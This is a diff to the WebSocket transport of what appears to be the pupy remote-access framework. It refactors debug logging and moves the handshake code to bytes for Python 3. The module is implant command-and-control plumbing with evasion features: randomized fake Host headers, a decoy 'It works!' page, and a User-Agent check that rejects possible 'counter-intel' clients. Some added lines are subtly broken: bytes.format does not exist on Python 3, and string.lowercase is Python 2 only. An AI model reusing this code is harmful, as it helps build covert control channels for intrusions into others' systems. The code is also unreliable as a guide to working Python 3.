@@ -22,6 +22,7 @@ import struct
 import random
 import string
 import re
+import sys
 
 from hashlib import sha1
 from pupy.network.lib.buffer import Buffer
@@ -32,6 +33,10 @@ from pupy.network.lib import getLogger
 from pupy.network.lib.transports.cryptoutils import XOR
 
 logger = getLogger('ws')
+
+def dprint(*args):
+    if __debug__:
+        logger.debug(*args)
 
 error_response_body = b'''<html><body><h1>It works!</h1>
 <p>This is the default web page for this server.</p>
@@ -89,7 +94,6 @@ def add_ws_encapsulation(data, output, mask=None, opcode=OPCODE_BINARY):
     if mask:
         header += mask
         modificator = XOR(mask).strxor
-
     output.write(header, notify=False)
     data.write_to(output, modificator=modificator)
 
@@ -115,8 +119,7 @@ def remove_ws_encapsulation(data, output, buf, offset, remainder, mask=None):
 
     if len(data) < 2:
         # Header too short
-        if __debug__:
-            logger.debug('Short read / 1: %d', len(data))
+        dprint('Short read / 1: %d', len(data))
 
         return 0, offset, remainder, mask
 
@@ -126,8 +129,7 @@ def remove_ws_encapsulation(data, output, buf, offset, remainder, mask=None):
     payload_len = b2 & PAYLOAD_LEN
     mask_len = MASK_LEN if masked else 0
 
-    if __debug__:
-        logger.debug('b1=%02x b2=%02x len=%d', b1, b2, payload_len)
+    dprint('b1=%02x b2=%02x len=%d', b1, b2, payload_len)
 
     if not b1:
         raise EOFError('Client closed connection')
@@ -145,8 +147,7 @@ def remove_ws_encapsulation(data, output, buf, offset, remainder, mask=None):
     if payload_len == PAYLOAD_LEN_EXT16:
         if len(data) < 2 + 2 + mask_len:
             # Header too short
-            if __debug__:
-                logger.debug('Header too short: %d < %d', len(data), 2 + 2 + mask_len)
+            dprint('Header too short: %d < %d', len(data), 2 + 2 + mask_len)
             return 0, offset, remainder, bool(mask_len)
 
         _, _, payload_len = struct.unpack('>BBH', data.read(4))
@@ -154,15 +155,13 @@ def remove_ws_encapsulation(data, output, buf, offset, remainder, mask=None):
     elif payload_len == PAYLOAD_LEN_EXT64:
         if len(data) < 2 + 8 + mask_len:
             # Header too short
-            if __debug__:
-                logger.debug('Header too short: %d < %d', len(data), 2 + 8 + mask_len)
+            dprint('Header too short: %d < %d', len(data), 2 + 8 + mask_len)
             return 0, offset, remainder, bool(mask_len)
 
         _, _, payload_len = struct.unpack('>BBQ', data.read(10))
     else:
         if len(data) < 2 + mask_len:
-            if __debug__:
-                logger.debug('Header too short: %d < %d', len(data), 2 + mask_len)
+            dprint('Header too short: %d < %d', len(data), 2 + mask_len)
             return 0, offset, remainder, bool(mask_len)
 
         # payload_len is b2, drain b1, b2
@@ -185,6 +184,12 @@ def remove_ws_encapsulation(data, output, buf, offset, remainder, mask=None):
     remainder = payload_len - written
     return 0, encoder.offset if encoder else 0, remainder, mask
 
+if sys.version_info[0]>2:
+    def gen_random_key(size=16):
+        return bytes(random.getrandbits(8) for _ in range(size))
+else:
+    def gen_random_key(size=16):
+        return ''.join(random.sample(string.printable,size))
 
 class PupyWebSocketTransport(BasePupyTransport):
     """
@@ -194,7 +199,7 @@ class PupyWebSocketTransport(BasePupyTransport):
 
 
 class PupyWebSocketClient(PupyWebSocketTransport):
-    socketkey = ''.join(random.sample(string.printable,16))
+    socketkey = gen_random_key()
 
     __slots__ = (
         'host', 'path', 'user_agent', 'offset',
@@ -230,44 +235,41 @@ class PupyWebSocketClient(PupyWebSocketTransport):
             self.host = 'www.' + ''.join(
                 random.sample(string.lowercase + '.-',16)) + '.net'
 
-        if __debug__:
-            logger.debug(
-                'WS Client, path=%s, user-agent=%s host=%s',
-                self.path, self.user_agent, self.host)
+        dprint(
+            'WS Client, path=%s, user-agent=%s host=%s',
+            self.path, self.user_agent, self.host)
 
     def on_connect(self):
         uri = self.path
         if self.proxy and self.connect:
             host, port = self.connect
             if port != 80:
-                uri = ':' + str(port) + uri
+                uri = (':' + str(port)) + uri
 
             uri = 'http://' + host + uri
 
         payload = [
-            'GET ', uri, ' HTTP/1.1\r\n',
-            'Host: ', self.host, '\r\n',
-            'User-Agent: ', self.user_agent, '\r\n',
-            'Upgrade: websocket\r\n',
-            'Connection: Upgrade\r\n'
+            b'GET ', uri.encode('utf8'), b' HTTP/1.1\r\n',
+            b'Host: ', self.host.encode('utf8'), b'\r\n',
+            b'User-Agent: ', self.user_agent.encode('utf8'), b'\r\n',
+            b'Upgrade: websocket\r\n',
+            b'Connection: Upgrade\r\n'
         ]
 
         if self.proxy and self.auth:
-            payload.append('Proxy-Authorization: Basic ')
+            payload.append(b'Proxy-Authorization: Basic ')
             payload.append(
-                base64.b64encode('{}:{}'.format(*self.auth))
+                base64.b64encode(b'{}:{}'.format(*self.auth))
             )
 
         payload.extend((
-            'Sec-WebSocket-Key: ', base64.b64encode(self.socketkey), '\r\n',
-            'Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n',
-            'Sec-WebSocket-Version: 13\r\n\r\n'
+            b'Sec-WebSocket-Key: ', base64.b64encode(self.socketkey), b'\r\n',
+            b'Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n',
+            b'Sec-WebSocket-Version: 13\r\n\r\n'
         ))
 
-        if __debug__:
-            logger.debug('Send upgrade request')
-
-        self.downstream.write(''.join(payload).encode('ascii'))
+        dprint('Send upgrade request')
+        self.downstream.write(b''.join(payload))
 
     def upstream_recv(self, data):
         """
@@ -275,15 +277,15 @@ class PupyWebSocketClient(PupyWebSocketTransport):
             Encoding Client -> Server
             mask the data
         """
-
         try:
-            mask = ''.join(random.sample(string.printable, MASK_LEN))
+            mask = gen_random_key(size=MASK_LEN)
             if self.upgraded:
                 add_ws_encapsulation(data, self.downstream, mask)
             else:
                 add_ws_encapsulation(data, self.upgraded_buf, mask)
 
         except Exception as e:
+            dprint("error in upstream_recv: %s", e)
             raise EOFError(str(e))
 
     def downstream_recv(self, data):
@@ -297,8 +299,7 @@ class PupyWebSocketClient(PupyWebSocketTransport):
                 d = data.peek(len(UPGRADE_101_SUCCESS))
                 if len(d) < len(UPGRADE_101_SUCCESS):
                     # Short answer
-                    if __debug__:
-                        logger.debug('Short answer (%s)', repr(d))
+                    dprint('Short answer (%s)', repr(d))
                     return
                 elif not d.startswith(b'HTTP/'):
                     raise EOFError('Invalid data')
@@ -307,40 +308,36 @@ class PupyWebSocketClient(PupyWebSocketTransport):
 
                 d = data.peek()
                 if b'\r\n\r\n' not in d:
-                    if __debug__:
-                        logger.debug('Incomplete header')
+                    dprint('Incomplete header')
                     return
 
                 EOFP = d.index(b'\r\n\r\n')
                 data.drain(EOFP + 4)
-                if __debug__:
-                    logger.debug('Connection upgraded')
+                dprint('Connection upgraded')
 
                 self.upgraded = True
 
                 if self.upgraded_buf:
-                    if __debug__:
-                        logger.debug('Flush buffer %d', len(self.upgraded_buf))
+                    dprint('Flush buffer %d', len(self.upgraded_buf))
 
                     self.upgraded_buf.write_to(self.downstream)
 
-            if __debug__:
-                logger.debug('Parse ws messages')
+            dprint('Parse ws messages')
 
             while data:
                 msg_len, self.offset, self.missing_bytes, _ = remove_ws_encapsulation(
                     data, self.upstream, self.decoded, self.offset, self.missing_bytes
                 )
 
-                if __debug__:
-                    logger.debug(
-                        'Parsed: %d, offset: %d, missing: %d, left: %d',
-                        msg_len, self.offset, self.missing_bytes, len(data))
+                dprint(
+                    'Parsed: %d, offset: %d, missing: %d, left: %d',
+                    msg_len, self.offset, self.missing_bytes, len(data))
 
                 if not msg_len:
                     break
 
         except Exception as e:
+            dprint("error in downstream_recv: %s", e)
             raise EOFError(str(e))
 
 
@@ -353,27 +350,25 @@ class PupyWebSocketServer(PupyWebSocketTransport):
     def __init__(self, *args, **kwargs):
         PupyWebSocketTransport.__init__(self, *args, **kwargs)
         self.upgraded = False
-        self.user_agent = kwargs.pop('user-agent')
-        self.path = kwargs.pop('path')
+        self.user_agent = kwargs.pop('user-agent').encode('utf8')
+        self.path = kwargs.pop('path').encode('utf8')
         self.mask = True
         self.offset = 0
         self.missing_bytes = 0
         self.decoded = Buffer()
         self.upgraded_buf = Buffer()
 
-        if __debug__:
-            logger.debug(
-                'WS Server, path=%s, user-agent=%s',
-                self.path, self.user_agent)
+        dprint(
+            'WS Server, path=%s, user-agent=%s',
+            self.path, self.user_agent)
 
     def calculate_response_key(self, key):
-        GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
-        hsh = sha1(key.encode() + GUID.encode())
+        GUID = b'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
+        hsh = sha1(key + GUID)
         return base64.b64encode(hsh.digest()).strip()
 
     def bad_request(self, msg):
-        if __debug__:
-            logger.debug(msg)
+        dprint(msg)
 
         self.downstream.write(error_response)
         self.close()
@@ -390,6 +385,7 @@ class PupyWebSocketServer(PupyWebSocketTransport):
                 add_ws_encapsulation(data, self.upgraded_buf)
 
         except Exception as e:
+            dprint("error in upstream_recv: %s", e)
             raise EOFError(str(e))
 
     def downstream_recv(self, data):
@@ -397,88 +393,83 @@ class PupyWebSocketServer(PupyWebSocketTransport):
             Decoding client -> server messages
             Message should be masked coming from client
         """
+        try:
+            if not self.upgraded:
+                dprint('WS: Wait for upgrade request')
 
-        if not self.upgraded:
-            if __debug__:
-                logger.debug('WS: Wait for upgrade requet')
+                d = data.peek()
+                # Handle HTTP GET requests, strip websocket keys, verify UA etc
+                if not d.startswith(b'GET '):
+                    self.bad_request('Invalid HTTP method or data ({})'.format(repr(d)))
 
-            d = data.peek()
-            # Handle HTTP GET requests, strip websocket keys, verify UA etc
-            if not d.startswith(b'GET '):
-                self.bad_request('Invalid HTTP method or data ({})'.format(repr(d)))
+                if b'\r\n\r\n' not in d:
+                    dprint('Short read, incomplete header')
+                    return
 
-            if b'\r\n\r\n' not in d:
-                if __debug__:
-                    logger.debug('Short read, incomplete header')
-                return
+                _, path, _ = d.split(b' ', 2)
+                if path != self.path:
+                    self.bad_request('Path does not match ({} != {})!'.format(
+                        repr(path), repr(self.path)))
+                    return
 
-            _, path, _ = d.split(b' ', 2)
-            if path != self.path:
-                self.bad_request('Path does not match ({} != {})!'.format(
-                    repr(path), repr(self.path)))
-                return
+                wskey = None
 
-            wskey = None
-
-            key = re.search(r'\n[sS]ec-[wW]eb[sS]ocket-[kK]ey[\s]*:[\s]*(.*)\r\n', d)
-            if key:
-                wskey = key.group(1)
-            else:
-                if __debug__:
-                    logger.debug('Unable to get WebSocketKey')
-
-            if self.user_agent:
-                ua = re.search(r'\n[uU]ser-[aA]gent:[\s]*(.*)\r\n', d)
-                if ua:
-                    ua = ua.group(1)
+                key = re.search(b'\n[sS]ec-[wW]eb[sS]ocket-[kK]ey[\\s]*:[\\s]*(.*)\r\n', d)
+                if key:
+                    wskey = key.group(1)
                 else:
-                    self.bad_request('No User-Agent provided')
-                    return
+                    dprint('Unable to get WebSocketKey')
 
-                if ua != self.user_agent:
-                    self.bad_request(
-                        'Bad User-Agent provided. May be counter-intel ({} != {})'.format(
-                            ua, self.user_agent))
-                    return
+                if self.user_agent:
+                    ua = re.search(b'\n[uU]ser-[aA]gent:[\\s]*(.*)\r\n', d)
+                    if ua:
+                        ua = ua.group(1)
+                    else:
+                        self.bad_request('No User-Agent provided')
+                        return
 
-            payload = [
-                'HTTP/1.1 101 Switching Protocols\r\n'
-                'Upgrade: websocket\r\n'
-                'Connection: Upgrade\r\n'
-            ]
+                    if ua != self.user_agent:
+                        self.bad_request(
+                            'Bad User-Agent provided. May be counter-intel ({} != {})'.format(
+                                ua, self.user_agent))
+                        return
 
-            if wskey:
-                payload.extend((
-                    'Sec-WebSocket-Accept: ', self.calculate_response_key(wskey), '\r\n'
-                ))
+                payload = [
+                    b'HTTP/1.1 101 Switching Protocols\r\n'
+                    b'Upgrade: websocket\r\n'
+                    b'Connection: Upgrade\r\n'
+                ]
 
-            payload.append('\r\n')
+                if wskey:
+                    payload.extend((
+                        b'Sec-WebSocket-Accept: ', self.calculate_response_key(wskey), b'\r\n'
+                    ))
 
-            data.drain(d.index(b'\r\n\r\n') + 4)
+                payload.append(b'\r\n')
 
-            if __debug__:
-                logger.debug('Flush upgrade response')
+                data.drain(d.index(b'\r\n\r\n') + 4)
 
-            self.downstream.write(''.join(payload).encode('ascii'))
+                dprint('Flush upgrade response')
+                self.downstream.write(b''.join(payload))
 
-            if self.upgraded_buf:
-                if __debug__:
-                    logger.debug('Flush buffer %d', len(self.upgraded_buf))
+                if self.upgraded_buf:
+                    dprint('Flush buffer %d', len(self.upgraded_buf))
 
-                self.upgraded_buf.write_to(self.downstream)
+                    self.upgraded_buf.write_to(self.downstream)
 
-            self.upgraded = True
+                self.upgraded = True
 
+            while data:
+                msg_len, self.offset, self.missing_bytes, self.mask = remove_ws_encapsulation(
+                    data, self.upstream, self.decoded,
+                    self.offset, self.missing_bytes, self.mask)
 
-        while data:
-            msg_len, self.offset, self.missing_bytes, self.mask = remove_ws_encapsulation(
-                data, self.upstream, self.decoded,
-                self.offset, self.missing_bytes, self.mask)
-
-            if __debug__:
-                logger.debug(
+                dprint(
                     'Parsed: %d, offset: %d, missing: %d, left: %d',
                     msg_len, self.offset, self.missing_bytes, len(data))
 
-            if not msg_len:
-                break
+                if not msg_len:
+                    break
+        except Exception as e:
+            dprint("error in downstream_recv: %s", e)
+            raise EOFError(str(e))
